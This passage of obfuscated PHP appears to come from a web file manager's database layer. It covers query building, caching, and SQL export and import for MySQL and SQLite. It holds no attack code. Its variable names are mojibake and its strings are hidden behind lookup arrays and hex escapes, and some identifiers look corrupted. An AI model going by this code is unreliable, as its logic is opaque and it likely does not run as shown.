$şºãØû² =& $_SERVER[ï»»·÷á]; $this->model = $¡ïÏ¡’œ[$şºãØû²[281]]; $£¼íöÕ¨ = $this->buildSelectSql($¡ïÏ¡’œ); $¼·™ïšÃ = isset($¡ïÏ¡’œ[$şºãØû²[349]]) ? $¡ïÏ¡’œ[$şºãØû²[349]] : !1; if ($¼·™ïšÃ) { $şíµ‚Òû = is_string($¼·™ïšÃ[$şºãØû²[94]]) ? $¼·™ïšÃ[$şºãØû²[94]] : $şºãØû²[1053] . md5($£¼íöÕ¨); $É…„ºªò = think_cache($şíµ‚Òû, $şºãØû²[12], $¼·™ïšÃ); if (!1 !== $É…„ºªò) { return $É…„ºªò; } } $«æËã±´ = $this->query($£¼íöÕ¨, $this->parseBind(!empty($¡ïÏ¡’œ[$şºãØû²[285]]) ? $¡ïÏ¡’œ[$şºãØû²[285]] : array())); if ($¼·™ïšÃ && !1 !== $«æËã±´) { think_cache($şíµ‚Òû, $«æËã±´, $¼·™ïšÃ); } return $«æËã±´; } public function buildSelectSql($¦é«šŒ¤ = array()) { $Œ°³»Ó =& $_SERVER[ï»»·÷á]; if (isset($¦é«šŒ¤[$Œ°³»Ó[353]])) { if (strpos($¦é«šŒ¤[$Œ°³»Ó[353]], $Œ°³»Ó[50])) { list($²æ²ßƒ, $Â¯‰¦ù¤) = explode($Œ°³»Ó[50], $¦é«šŒ¤[$Œ°³»Ó[353]]); } else { $²æ²ßƒ = $¦é«šŒ¤[$Œ°³»Ó[353]]; } $²æ²ßƒ = $²æ²ßƒ ? $²æ²ßƒ : 1; $Â¯‰¦ù¤ = isset($Â¯‰¦ù¤) ? $Â¯‰¦ù¤ : (is_numeric($¦é«šŒ¤[$Œ°³»Ó[292]]) ? $¦é«šŒ¤[$Œ°³»Ó[292]] : 20); $š­ÇÂ­‡ = $Â¯‰¦ù¤ * ((int) $²æ²ßƒ - 1); $¦é«šŒ¤[$Œ°³»Ó[292]] = $š­ÇÂ­‡ . $Œ°³»Ó[50] . $Â¯‰¦ù¤; } if (think_config($Œ°³»Ó[1054])) { $¼Ë÷Ç”˜ = $Œ°³»Ó[1055] . md5(serialize($¦é«šŒ¤)); $êä÷”‰ = think_cache($¼Ë÷Ç”˜); if ($êä÷”‰) { return $êä÷”‰; } } $ÙÀ˜ãÀ¹ = $this->parseSql($this->selectSql, $¦é«šŒ¤); $ÙÀ˜ãÀ¹ .= $this->parseLock(isset($¦é«šŒ¤[$Œ°³»Ó[856]]) ? $¦é«šŒ¤[$Œ°³»Ó[856]] : !1); if (isset($¼Ë÷Ç”˜)) { think_cache($¼Ë÷Ç”˜, $ÙÀ˜ãÀ¹); } return $ÙÀ˜ãÀ¹; } public function parseSql($•·’™ı…, $‹•êÛ± = array()) { $¤ÎÑûàı =& $_SERVER[ï»»·÷á]; $•·’™ı… = str_replace(array($¤ÎÑûàı[1056], $¤ÎÑûàı[1057], $¤ÎÑûàı[1058], $¤ÎÑûàı[1059], $¤ÎÑûàı[1060], $¤ÎÑûàı[1061], $¤ÎÑûàı[1062], $¤ÎÑûàı[1063], $¤ÎÑûàı[1064], $¤ÎÑûàı[1065], $¤ÎÑûàı[1066]), array($this->parseTable("{$‹•êÛ±[$¤ÎÑûàı[279]]}"), $this->parseDistinct(isset($‹•êÛ±[$¤ÎÑûàı[1067]]) ? $‹•êÛ±[$¤ÎÑûàı[1067]] : !1), $this->parseField(!empty($‹•êÛ±[$¤ÎÑûàı[273]]) ? $‹•êÛ±[$¤ÎÑûàı[273]] : $¤ÎÑûàı[189]), $this->parseJoin(!empty($‹•êÛ±[$¤ÎÑûàı[282]]) ? $‹•êÛ±[$¤ÎÑûàı[282]] : $¤ÎÑûàı[12]), $this->parseWhere(!empty($‹•êÛ±[$¤ÎÑûàı[275]]) ? $‹•êÛ±[$¤ÎÑûàı[275]] : $¤ÎÑûàı[12]), $this->parseGroup(!empty($‹•êÛ±[$¤ÎÑûàı[514]]) ? $‹•êÛ±[$¤ÎÑûàı[514]] : $¤ÎÑûàı[12]), $this->parseHaving(!empty($‹•êÛ±[$¤ÎÑûàı[1068]]) ? $‹•êÛ±[$¤ÎÑûàı[1068]] : $¤ÎÑûàı[12]), $this->parseOrder(!empty($‹•êÛ±[$¤ÎÑûàı[365]]) ? $‹•êÛ±[$¤ÎÑûàı[365]] : $¤ÎÑûàı[12]), $this->parseLimit(!empty($‹•êÛ±[$¤ÎÑûàı[292]]) ? $‹•êÛ±[$¤ÎÑûàı[292]] : $¤ÎÑûàı[12]), $this->parseUnion(!empty($‹•êÛ±[$¤ÎÑûàı[347]]) ? $‹•êÛ±[$¤ÎÑûàı[347]] : $¤ÎÑûàı[12]), $this->parseComment(!empty($‹•êÛ±[$¤ÎÑûàı[354]]) ? $‹•êÛ±[$¤ÎÑûàı[354]] : $¤ÎÑûàı[12])), $•·’™ı…); return $•·’™ı…; } public function getLastSql($ÃóØú = '') { return $ÃóØú ? $this->modelSql[$ÃóØú] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($­ÉŞ˜ Ã) { return addslashes($­ÉŞ˜ Ã); } public function setModel($öó¹ÄÃŸ) { $this->model = $öó¹ÄÃŸ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($ îêõƒÒ = array()) { $«à±ØÆ =& $_SERVER[ï»»·÷á]; if (empty($ îêõƒÒ)) { $ îêõƒÒ = $GLOBALS[$«à±ØÆ[6]][$«à±ØÆ[21]]; } $this->database = $ îêõƒÒ; } public function model($¨ºÔãøÅ = '') { return new ModelBase($¨ºÔãøÅ, $_SERVER[ï»»·÷á][12], $this->database); } public function db($ö•Àê’¬ = false) { $†ô»©æ =& $_SERVER[ï»»·÷á]; $şû¤¯¨œ = array_change_key_case($this->database); if ($this->dbType() == $†ô»©æ[13] || !$ö•Àê’¬) { return $this->model()->db(); } $Ôó¯« = $şû¤¯¨œ[$†ô»©æ[982]]; $şû¤¯¨œ[$†ô»©æ[982]] = $†ô»©æ[12]; if ($şû¤¯¨œ[$†ô»©æ[977]] == $†ô»©æ[974]) { $ÑÍÔš = $şû¤¯¨œ[$†ô»©æ[983]]; $şû¤¯¨œ[$†ô»©æ[983]] = substr($ÑÍÔš, 0, strrpos($ÑÍÔš, $†ô»©æ[1069])); } $this->database = $şû¤¯¨œ; $Ôô€Ì’Ä = $this->model()->db(); try { $ÏÕŸÕÛß = $Ôô€Ì’Ä->execute("\x73\x68\x6f\x77\40\x64\x61\x74\141\142\x61\x73\x65\x73\x20\154\151\153\145\x20\x27{$Ôó¯«}\47"); } catch (Exception $èà¡ù›) { } if (!$ÏÕŸÕÛß) { $Ôô€Ì’Ä->execute("\x63\x72\x65\141\164\x65\x20\144\x61\164\141\x62\141\163\145\x20\x60{$Ôó¯«}\140"); } $şû¤¯¨œ[$†ô»©æ[982]] = $Ôó¯«; if ($şû¤¯¨œ[$†ô»©æ[977]] == $†ô»©æ[974]) { $şû¤¯¨œ[$†ô»©æ[983]] .= $†ô»©æ[1069] . $Ôó¯«; } $this->database = $şû¤¯¨œ; $Ôô€Ì’Ä->execute("\165\x73\x65\x20\140{$Ôó¯«}\140"); return $Ôô€Ì’Ä; } public function createTable($Û˜ÊÌ•±, &$ëîæ¶) { $°˜ºŸ” =& $_SERVER[ï»»·÷á]; if (!IO::exist($Û˜ÊÌ•±)) { ActionCall($°˜ºŸ”[1070], !0, 0); show_json(LNG($°˜ºŸ”[1071]), !1); } $ºÔ€üÃ‚ = $this->model()->db(); $¿Ê–÷€Ù = sqlSplit(IO::getContent($Û˜ÊÌ•±)); foreach ($¿Ê–÷€Ù as $ÄÉìøş¤) { $ğÛ¢­ß· = stripos($ÄÉìøş¤, $°˜ºŸ”[1072]) === 0; if ($ğÛ¢­ß·) { $ëîæ¶->task[$°˜ºŸ”[799]] += 1; } $ºÔ€üÃ‚->execute($ÄÉìøş¤); if ($ğÛ¢­ß·) { preg_match($°˜ºŸ”[1073], $ÄÉìøş¤, $ “ü“Õ); $ëîæ¶->task[$°˜ºŸ”[1074]] = $ “ü“Õ[1]; $ëîæ¶->update(1); } } } public function insertTable($€ı“¯Áæ, &$Ô¦Åœ—) { $Ä£¼¿¤’ =& $_SERVER[ï»»·÷á]; $¶úÉÁ™ = $this->model()->db(); $ğì¿°¶ã = $¬¾„µ ? array($¬¾„µ) : $¶úÉÁ™->getTables(); foreach ($€ı“¯Áæ as $øãšğ’‰) { $¬¾„µ = basename($øãšğ’‰, $Ä£¼¿¤’[801]); if (!in_array($¬¾„µ, $ğì¿°¶ã)) { continue; } $Ô¦Åœ—->task[$Ä£¼¿¤’[1074]] = $¬¾„µ; if (get_filesize($øãšğ’‰) == 0) { continue; } $ëì½øŸ = $this->sqlToDb($øãšğ’‰, $Ô¦Åœ—); if (!$ëì½øŸ) { ActionCall($Ä£¼¿¤’[1070], !0, 0); show_json(LNG($Ä£¼¿¤’[1075]) . "\x5b{$¬¾„µ}\135", !1); } } } public function sqlFromDb($“·¯…ÖŞ, $Ï°§É½„, &$ïœá’, $Ø ›Óú = '') { if ($ïœá’) { $ïœá’->task[$_SERVER[ï»»·÷á][1074]] = $“·¯…ÖŞ; } $£Ğ€É‘¼ = $this->model($“·¯…ÖŞ); $½Íö†Ïİ = 0; $à–ÀÀˆâ = 0; $¿ÇƒÈÆë = 10000; $¡âÒŞÉŒ = fopen($Ï°§É½„, $_SERVER[ï»»·÷á][1076]); $•äŒ£ Æ = $£Ğ€É‘¼->getPk(); $Œ¨˜À¼Ü = $£Ğ€É‘¼->getDbFields(); $öîÍÒâş = $_SERVER[ï»»·÷á][12]; if ($GLOBALS[$_SERVER[ï»»·÷á][800]] && in_array($“·¯…ÖŞ, array($_SERVER[ï»»·÷á][1077], $_SERVER[ï»»·÷á][1078]))) { $öîÍÒâş = $“·¯…ÖŞ; } do { $ìÎ÷æ‹× = array($•äŒ£ Æ => array($_SERVER[ï»»·÷á][1024], $à–ÀÀˆâ)); $¡ˆÊ­«§ = $£Ğ€É‘¼->where($ìÎ÷æ‹×)->field($Œ¨˜À¼Ü)->order($•äŒ£ Æ . $_SERVER[ï»»·÷á][1079])->limit($¿ÇƒÈÆë)->select(); $¡ˆÊ­«§ = !empty($¡ˆÊ­«§) ? $¡ˆÊ­«§ : array(); if (!($¤Î·Ö«§ = count($¡ˆÊ­«§))) { break; } $â’…••Š = end($¡ˆÊ­«§); $à–ÀÀˆâ = $â’…••Š[$•äŒ£ Æ]; $«¡Ëæ¼” = array(); foreach ($¡ˆÊ­«§ as $õ€”ó¡ß) { if ($öîÍÒâş) { if ($“·¯…ÖŞ == $_SERVER[ï»»·÷á][1077]) { if ($õ€”ó¡ß[$_SERVER[ï»»·÷á][33]] == $_SERVER[ï»»·÷á][1080]) { $Ö¥£“Ğ¼ = json_decode($õ€”ó¡ß[$_SERVER[ï»»·÷á][374]], !0); if ($Ö¥£“Ğ¼[$_SERVER[ï»»·÷á][32]] == $GLOBALS[$_SERVER[ï»»·÷á][800]] && $Ö¥£“Ğ¼[$_SERVER[ï»»·÷á][762]] != 1) { continue; } } } else { if ($õ€”ó¡ß[$_SERVER[ï»»·÷á][33]] == $_SERVER[ï»»·÷á][1081] && $õ€”ó¡ß[$_SERVER[ï»»·÷á][94]] == $_SERVER[ï»»·÷á][792]) { continue; } } } if ($Ø ›Óú) { $õ€”ó¡ß[$_SERVER[ï»»·÷á][84]] = "\173\151\157\x3a{$Ø ›Óú}\175" . substr($õ€”ó¡ß[$_SERVER[ï»»·÷á][84]], strlen("\x7b\151\157\x3a{$õ€”ó¡ß[$_SERVER[ï»»·÷á][830]]}\x7d")); $õ€”ó¡ß[$_SERVER[ï»»·÷á][830]] = $Ø ›Óú; } $«¡Ëæ¼”[] = $_SERVER[ï»»·÷á][1082] . $this->sqlEncode($õ€”ó¡ß) . $_SERVER[ï»»·÷á][1083]; } $ÂÄ…ùĞ = "\111\116\123\x45\x52\124\x20\111\116\124\x4f\x20\x60{$“·¯…ÖŞ}\x60\40\50\x60" . implode($_SERVER[ï»»·÷á][1084], $Œ¨˜À¼Ü) . $_SERVER[ï»»·÷á][1085]; fwrite($¡âÒŞÉŒ, $ÂÄ…ùĞ . implode($_SERVER[ï»»·÷á][1086], $«¡Ëæ¼”) . $_SERVER[ï»»·÷á][71] . PHP_EOL); $½Íö†Ïİ += $¤Î·Ö«§; if ($ïœá’) { $ïœá’->update($¤Î·Ö«§); } } while ($¿ÇƒÈÆë == $¤Î·Ö«§); fclose($¡âÒŞÉŒ); return $½Íö†Ïİ; } public function sqlToDb($¥ÚÔû‹, &$º¬‰ïí) { $å âòş¼ =& $_SERVER[ï»»·÷á]; $¾ºáÕ¶ = $this->model()->db(); $ó“ì«Ş¶ = @fopen($¥ÚÔû‹, $å âòş¼[1087]); if (!$ó“ì«Ş¶) { return !1; } $ßÕÀã = 0; $®¸œÚøÊ = $å âòş¼[12]; $àÏá ñÚ = array(); $İŞ¤¯¶µ = $this->dbType(); $¹õĞ†æ = $İŞ¤¯¶µ == $å âòş¼[13] ? 500 : 2000; $Îûí®¯ = basename($¥ÚÔû‹, $å âòş¼[801]); $Ü¬¨ËÎø = 0; $İÚÄó«ô = 4194304 - 104858; $‘ÙÀøÎø = 1000000 - 104858; while (!feof($ó“ì«Ş¶)) { $îñÒÀ¨§ = trim(fgets($ó“ì«Ş¶)); if (!$îñÒÀ¨§) { continue; } $¸”¨å÷­ = $this->sqlDecode($îñÒÀ¨§, $İŞ¤¯¶µ, $Îûí®¯); if (stripos($¸”¨å÷­, $å âòş¼[355]) === 0) { if (!$®¸œÚøÊ) { $®¸œÚøÊ = $¸”¨å÷­ . $å âòş¼[53]; } continue; } if ($º¬‰ïí) { $º¬‰ïí->task[$å âòş¼[799]] += 1; } $ßÕÀã++; $àÏá ñÚ[] = rtrim(rtrim(trim($¸”¨å÷­), $å âòş¼[50]), $å âòş¼[71]); $ú¯¶›ğÍ = null; $ü”íÇáÇ = strlen($¸”¨å÷­); $Ü¬¨ËÎø += $ü”íÇáÇ; if ($Ü¬¨ËÎø >= ($¹õĞ†æ == 500 ? $‘ÙÀøÎø : $İÚÄó«ô)) { $ú¯¶›ğÍ = array_pop($àÏá ñÚ); if ($ßÕÀã > 1) { $ßÕÀã--; } } if ($ßÕÀã >= $¹õĞ†æ || $ú¯¶›ğÍ) { $¸”¨å÷­ = $®¸œÚøÊ . implode($å âòş¼[50], $àÏá ñÚ); if (!$¾ºáÕ¶->execute($¸”¨å÷­)) { return !1; } if ($º¬‰ïí) { $º¬‰ïí->update($ßÕÀã); } $àÏá ñÚ = array(); $ßÕÀã = 0; $Ü¬¨ËÎø = 0; if ($ú¯¶›ğÍ) { $àÏá ñÚ = array($ú¯¶›ğÍ); $ßÕÀã = 1; $Ü¬¨ËÎø = $ü”íÇáÇ; } } } fclose($ó“ì«Ş¶); if (!empty($àÏá ñÚ)) { $¸”¨å÷­ = $®¸œÚøÊ . implode($å âòş¼[50], $àÏá ñÚ); if (!$¾ºáÕ¶->execute($¸”¨å÷­)) { return !1; } if ($º¬‰ïí) { $º¬‰ïí->update($ßÕÀã); } } return !0; } public function dropTable($ê›½Í = null) { $í£¶úÉ = $this->model()->db(); $ÓæñÏ× = $ê›½Í ? array($ê›½Í) : $í£¶úÉ->getTables(); if (!$ÓæñÏ×) { return; } foreach ($ÓæñÏ× as $ê›½Í) { if ($ê›½Í) { $ê›½Í = strtolower($ê›½Í); } else { continue; } $í£¶úÉ->execute("\144\162\157\x70\40\164\141\x62\x6c\145\x20\x69\x66\x20\145\170\151\x73\x74\x73\40\x60{$ê›½Í}\x60"); } } private function sqlEncode($°­±Åƒ¦) { $‰£¶ºÃ‘ =& $_SERVER[ï»»·÷á]; $ğ¦—»ßã = array(); foreach ($°­±Åƒ¦ as $Ï®·‹Œƒ) { if (is_array($Ï®·‹Œƒ)) { $Ï®·‹Œƒ = json_encode_force($Ï®·‹Œƒ); } $Ï®·‹Œƒ = addslashes($Ï®·‹Œƒ); $Ï®·‹Œƒ = str_replace(array($‰£¶ºÃ‘[1088], $‰£¶ºÃ‘[231]), array($‰£¶ºÃ‘[1089], $‰£¶ºÃ‘[1090]), $Ï®·‹Œƒ); $ğ¦—»ßã[] = str_replace($‰£¶ºÃ‘[58], $‰£¶ºÃ‘[1091], $Ï®·‹Œƒ); } return $‰£¶ºÃ‘[58] . implode($‰£¶ºÃ‘[1092], $ğ¦—»ßã) . $‰£¶ºÃ‘[58]; } private function sqlDecode($¦®ÒèØ, $©÷ÖÃ–, $Ğ¶§Ñ‚ = '') { $•òÇÂ£‰ =& $_SERVER[ï»»·÷á]; $¦®ÒèØ = str_replace(array($•òÇÂ£‰[1089], $•òÇÂ£‰[1090]), array($•òÇÂ£‰[1088], $•òÇÂ£‰[231]), $¦®ÒèØ); if ($©÷ÖÃ– == $•òÇÂ£‰[13]) { return $Ğ¶§Ñ‚ != $•òÇÂ£‰[1093] ? stripslashes($¦®ÒèØ) : $¦®ÒèØ; } if ($Ğ¶§Ñ‚ == $•òÇÂ£‰[1093]) { $¦®ÒèØ = str_replace($•òÇÂ£‰[1094], $•òÇÂ£‰[118], stripslashes($¦®ÒèØ)); } return $¦®ÒèØ; } public function getSqlFile($­éíƒº = '') { $ÃŸäõ‰ =& $_SERVER[ï»»·÷á]; $Ù¤Ïòõ’ = $this->dbType(!0); $†ëƒÊı• = CONTROLLER_DIR . "\151\156\163\x74\x61\154\154\57\144\141\164\141\57{$Ù¤Ïòõ’}\56\163\x71\x6c"; $èö›à¯ì = file_get_contents($†ëƒÊı•); $¾¯¶°ıÄ = $ÃŸäõ‰[1095] . ($Ù¤Ïòõ’ == $ÃŸäõ‰[817] ? $ÃŸäõ‰[1096] : $ÃŸäõ‰[1097]) . $ÃŸäõ‰[1098]; preg_match_all($¾¯¶°ıÄ, $èö›à¯ì, $ÓşçƒÇ£); $Ù®ä¹Ü = $ÓşçƒÇ£[1]; $¾æ™—ğ— = $this->model()->db(); $ğñ‚Ï˜ = $¾æ™—ğ—->getTables(); $ĞîÇªï˜ = TEMP_FILES . $ÃŸäõ‰[1099] . date($ÃŸäõ‰[763]) . $ÃŸäõ‰[8]; del_dir($ĞîÇªï˜); mk_dir($ĞîÇªï˜); $üÄ…ÏÜú = $ĞîÇªï˜ . $ÃŸäõ‰[1100]; $ÆïóÑİ² = $ĞîÇªï˜ . $ÃŸäõ‰[1101]; $›Šğ‹£ = $Ù¤Ïòõ’ == $ÃŸäõ‰[13] ? $ÃŸäõ‰[817] : $ÃŸäõ‰[13]; IO::copy(CONTROLLER_DIR . "\151\x6e\x73\x74\141\154\154\x2f\144\x61\x74\141\x2f{$›Šğ‹£}\x2e\x73\x71\x6c", $ĞîÇªï˜); @touch($ĞîÇªï˜ . $Ù¤Ïòõ’ . $ÃŸäõ‰[801]); $Çµè…Ñ— = fopen($üÄ…ÏÜú, $ÃŸäõ‰[1076]); $–ùÙÈãš = fopen($ÆïóÑİ², $ÃŸäõ‰[1076]); if ($Ù¤Ïòõ’ == $ÃŸäõ‰[13]) { $ğñ‚Ï˜ = array_diff($ğñ‚Ï˜, array($ÃŸäõ‰[797], $ÃŸäõ‰[798])); $ÖÛÃÏçö = array($ÃŸäõ‰[1102], $ÃŸäõ‰[1103], $ÃŸäõ‰[1104]); fwrite($–ùÙÈãš, implode(PHP_EOL, $ÖÛÃÏçö) . PHP_EOL . PHP_EOL); foreach ($ğñ‚Ï˜ as $‰•·©µ‘) { $‹™åš“Õ = $this->sqlFromSqlite($‰•·©µ‘); if (!$‹™åš“Õ[$ÃŸäõ‰[13]]) { continue; } fwrite($–ùÙÈãš, $‹™åš“Õ[$ÃŸäõ‰[13]] . PHP_EOL . PHP_EOL); if (!in_array($‰•·©µ‘, $Ù®ä¹Ü)) { fwrite($Çµè…Ñ—, $‹™åš“Õ[$ÃŸäõ‰[817]] . PHP_EOL . PHP_EOL); } } } else { foreach ($ğñ‚Ï˜ as $‰•·©µ‘) { $‹™åš“Õ = $this->sqlFromMysql($‰•·©µ‘); if (!$‹™åš“Õ[$ÃŸäõ‰[817]]) { continue; } fwrite($Çµè…Ñ—, $‹™åš“Õ[$ÃŸäõ‰[817]] . PHP_EOL . PHP_EOL); if (!in_array($‰•·©µ‘, $Ù®ä¹Ü)) { fwrite($–ùÙÈãš, $‹™åš“Õ[$ÃŸäõ‰[13]] . PHP_EOL . PHP_EOL); } } } fclose($Çµè…Ñ—); fclose($–ùÙÈãš); $èö›à¯ì = array($ÃŸäõ‰[817] => $üÄ…ÏÜú, $ÃŸäõ‰[13] => $ÆïóÑİ²); return $­éíƒº ? $èö›à¯ì[$­éíƒº] : $èö›à¯ì; } public function dbType($Ñá—Ş®± = false) { $èĞóÓ‹Î =& $_SERVER[ï»»·÷á]; $Ñøí±µ’ = $Ñá—Ş®± ? $GLOBALS[$èĞóÓ‹Î[6]][$èĞóÓ‹Î[21]] : $this->database; $Ñøí±µ’ = array_change_key_case($Ñøí±µ’); $‚Ëüš¶ = $Ñøí±µ’[$èĞóÓ‹Î[977]]; if ($‚Ëüš¶ == $èĞóÓ‹Î[974]) { $ú¯ÑíÎÍ = explode($èĞóÓ‹Î[4], $Ñøí±µ’[$èĞóÓ‹Î[983]]); $‚Ëüš¶ = $ú¯ÑíÎÍ[0]; } $œÇ€ÊÔ¨ = array($èĞóÓ‹Î[1105] => $èĞóÓ‹Î[13], $èĞóÓ‹Î[922] => $èĞóÓ‹Î[817]); if (isset($œÇ€ÊÔ¨[$‚Ëüš¶])) { $‚Ëüš¶ = $œÇ€ÊÔ¨[$‚Ëüš¶]; } return $‚Ëüš¶; } public function sqlFromMysql($ƒóº€çØ, $½ÖÓÑñé = '') { $éÑŸ¯‡Ğ =& $_SERVER[ï»»·÷á]; $ ™ûš´ = $this->model()->db(); $ãÏÕß³Ã = $ ™ûš´->query($éÑŸ¯‡Ğ[1106] . $ƒóº€çØ . $éÑŸ¯‡Ğ[385]); if (!$ãÏÕß³Ã || !$ãÏÕß³Ã[0]) { return !1; } $ºÇ‹ÙøÀ = _get($ãÏÕß³Ã[0], $éÑŸ¯‡Ğ[1107], $éÑŸ¯‡Ğ[12]); if (!$ºÇ‹ÙøÀ) { return !1; } $ª…æ¿áì = "\104\x52\x4f\120\40\x54\101\102\114\x45\40\111\106\40\x45\x58\x49\123\124\x53\40\140{$ƒóº€çØ}\140\x3b" . PHP_EOL . $ºÇ‹ÙøÀ . $éÑŸ¯‡Ğ[71]; if ($½ÖÓÑñé && $½ÖÓÑñé == $éÑŸ¯‡Ğ[817]) { return $ª…æ¿áì; } $ËËõ·‚ƒ = array_change_key_case($GLOBALS[$éÑŸ¯‡Ğ[6]][$éÑŸ¯‡Ğ[21]]); $ÆáÈ¯¢ = $ËËõ·‚ƒ[$éÑŸ¯‡Ğ[982]]; $¹‡æßê¢ = $éÑŸ¯‡Ğ[1108] . $ÆáÈ¯¢ . $éÑŸ¯‡Ğ[1109] . $ƒóº€çØ . $éÑŸ¯‡Ğ[58]; $¯Óôª³¼ = $éÑŸ¯‡Ğ[1110] . $ƒóº€çØ . $éÑŸ¯‡Ğ[910]; $¼¨Óšò‡ = $ ™ûš´->query($¹‡æßê¢); if (empty($¼¨Óšò‡)) { $íê¡‚â = array($éÑŸ¯‡Ğ[817] => $éÑŸ¯‡Ğ[12], $éÑŸ¯‡Ğ[13] => $éÑŸ¯‡Ğ[12]); return $½ÖÓÑñé ? $íê¡‚â[$½ÖÓÑñé] : $íê¡‚â; } $Â‹Õ“õ– = $ ™ûš´->query($¯Óôª³¼); $ªñ±ü›× = $éÑŸ¯‡Ğ[12]; $˜ÛÚ— = array(); foreach ($Â‹Õ“õ– as $ÈÙ·Á½”) { if (!$ªñ±ü›× && $ÈÙ·Á½”[$éÑŸ¯‡Ğ[1111]] == $éÑŸ¯‡Ğ[1112]) { $ªñ±ü›× = $ÈÙ·Á½”[$éÑŸ¯‡Ğ[1113]]; } if (isset($˜ÛÚ—[$ÈÙ·Á½”[$éÑŸ¯‡Ğ[1111]]])) { $˜ÛÚ—[$ÈÙ·Á½”[$éÑŸ¯‡Ğ[1111]]][$éÑŸ¯‡Ğ[1114]][] = $ÈÙ·Á½”[$éÑŸ¯‡Ğ[1113]]; continue; } $˜ÛÚ—[$ÈÙ·Á½”[$éÑŸ¯‡Ğ[1111]]] = array($éÑŸ¯‡Ğ[1115] => $ÈÙ·Á½”[$éÑŸ¯‡Ğ[1111]], $éÑŸ¯‡Ğ[1114] => array($ÈÙ·Á½”[$éÑŸ¯‡Ğ[1113]]), $éÑŸ¯‡Ğ[1116] => $ÈÙ·Á½”[$éÑŸ¯‡Ğ[1117]] == $éÑŸ¯‡Ğ[88] ? 0 : 1); } $ô´¶Ğ³ö = array(); foreach ($˜ÛÚ— as $ÈÙ·Á½”) { $¢ğ‹•øº = $ÈÙ·Á½”[$éÑŸ¯‡Ğ[1115]] == $éÑŸ¯‡Ğ[1112]; $éµşîÅŞ = array($éÑŸ¯‡Ğ[1118], $ÈÙ·Á½”[$éÑŸ¯‡Ğ[1116]] == $éÑŸ¯‡Ğ[88] && !$¢ğ‹•øº ? $éÑŸ¯‡Ğ[1119] : $éÑŸ¯‡Ğ[12], $éÑŸ¯‡Ğ[1120], $éÑŸ¯‡Ğ[1121] . $ƒóº€çØ . $éÑŸ¯‡Ğ[11] . ($¢ğ‹•øº ? $éÑŸ¯‡Ğ[1122] : $ÈÙ·Á½”[$éÑŸ¯‡Ğ[1115]]) . $éÑŸ¯‡Ğ[118], $éÑŸ¯‡Ğ[1123], $éÑŸ¯‡Ğ[118] . $ƒóº€çØ . $éÑŸ¯‡Ğ[118], $éÑŸ¯‡Ğ[1124] . implode($éÑŸ¯‡Ğ[1125], $ÈÙ·Á½”[$éÑŸ¯‡Ğ[1114]]) . $éÑŸ¯‡Ğ[1126]); $ô´¶Ğ³ö[] = implode($éÑŸ¯‡Ğ[53], $éµşîÅŞ) . $éÑŸ¯‡Ğ[71]; } $¥Á•ŸÓ = array(); $ØÀåÔ…í = array($éÑŸ¯‡Ğ[1127] => $éÑŸ¯‡Ğ[1128], $éÑŸ¯‡Ğ[1128] => $éÑŸ¯‡Ğ[1128], $éÑŸ¯‡Ğ[288] => $éÑŸ¯‡Ğ[315], $éÑŸ¯‡Ğ[287] => $éÑŸ¯‡Ğ[315]); foreach ($¼¨Óšò‡ as $ÈÙ·Á½”) { $éµşîÅŞ = array($éÑŸ¯‡Ğ[118] . $ÈÙ·Á½”[$éÑŸ¯‡Ğ[1129]] . $éÑŸ¯‡Ğ[118], isset($ØÀåÔ…í[$ÈÙ·Á½”[$éÑŸ¯‡Ğ[1130]]]) ? $ØÀåÔ…í[$ÈÙ·Á½”[$éÑŸ¯‡Ğ[1130]]] : $ÈÙ·Á½”[$éÑŸ¯‡Ğ[1131]], $ÈÙ·Á½”[$éÑŸ¯‡Ğ[1132]] == $éÑŸ¯‡Ğ[908] ? $éÑŸ¯‡Ğ[1133] : $éÑŸ¯‡Ğ[1134], $ÈÙ·Á½”[$éÑŸ¯‡Ğ[1129]] == $ªñ±ü›× ? $éÑŸ¯‡Ğ[1135] : $éÑŸ¯‡Ğ[12], $ÈÙ·Á½”[$éÑŸ¯‡Ğ[959]] ? strtoupper(str_replace($éÑŸ¯‡Ğ[11], $éÑŸ¯‡Ğ[12], $ÈÙ·Á½”[$éÑŸ¯‡Ğ[959]])) : $éÑŸ¯‡Ğ[12]); $¥Á•ŸÓ[] = trim(implode($éÑŸ¯‡Ğ[53], $éµşîÅŞ)); } $ä‡­ê…÷ = array($éÑŸ¯‡Ğ[1136] . $ƒóº€çØ . $éÑŸ¯‡Ğ[1137], $éÑŸ¯‡Ğ[1138] . $ƒóº€çØ . $éÑŸ¯‡Ğ[1139], implode($éÑŸ¯‡Ğ[50] . PHP_EOL, $¥Á•ŸÓ), $éÑŸ¯‡Ğ[956]); $È˜•Õã = implode(PHP_EOL, array_merge($ä‡­ê…÷, $ô´¶Ğ³ö)); if ($½ÖÓÑñé && $½ÖÓÑñé == $éÑŸ¯‡Ğ[13]) { return $È˜•Õã; } $íê¡‚â = array($éÑŸ¯‡Ğ[817] => $ª…æ¿áì, $éÑŸ¯‡Ğ[13] => $È˜•Õã); return $½ÖÓÑñé ? $íê¡‚â[$½ÖÓÑñé] : $íê¡‚â; } public function sqlFromSqlite($±çï©šà, $˜­Ì··  = '') { $Ù¦«†ıè =& $_SERVER[ï»»·÷á]; $õ¡‡¡¤ş = $this->model()->db(); $”öñƒŒÅ = "\x50\x52\101\107\115\101\x20\124\101\102\x4c\105\x5f\111\116\x46\x4f\x20\x28\x27{$±çï©šà}\x27\51"; $ì‡Îù„¼ = "\123\x45\114\105\103\x54\40\52\40\106\x52\117\x4d\x20\163\161\x6c\x69\164\x65\137\x6d\141\x73\164\x65\162\x20\127\110\x45\x52\105\40\164\x62\x6c\x5f\156\x61\x6d\145\x20\x3d\40\47{$±çï©šà}\x27"; $š—²¡¾Ñ = $õ¡‡¡¤ş->query($”öñƒŒÅ); if (empty($š—²¡¾Ñ)) { $°—©µóÇ = array($Ù¦«†ıè[817] => $Ù¦«†ıè[12], $Ù¦«†ıè[13] => $Ù¦«†ıè[12]); return $˜­Ì··  ? $°—©µóÇ[$˜­Ì·· ] : $°—©µóÇ; } $ø»ø‹äñ = $õ¡‡¡¤ş->query($ì‡Îù„¼); $ïŞâïıö = $×Ããƒ“Ù = array(); foreach ($ø»ø‹äñ as $ ¬ËßÈ) { if ($ ¬ËßÈ[$Ù¦«†ıè[33]] == $Ù¦«†ıè[279]) { $ïŞâïıö[] = $ ¬ËßÈ[$Ù¦«†ıè[1140]]; } else { 